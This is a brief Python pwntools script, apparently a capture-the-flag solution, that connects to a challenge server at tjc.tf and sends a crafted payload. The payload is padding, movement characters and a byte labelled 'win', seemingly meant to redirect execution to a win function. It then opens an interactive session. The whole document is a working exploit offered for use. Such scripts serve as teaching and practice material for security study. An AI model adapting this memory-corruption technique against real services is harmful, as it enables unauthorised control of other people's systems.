from pwn import *

# io = process('./game')
# gdb.attach(io, api=True)
io = remote('tjc.tf', 31119)

win = b'\xe4'
payload = b'a'*28 + b'w'*3 + b'l' + win + b'w'
io.sendline(payload)
io.interactive()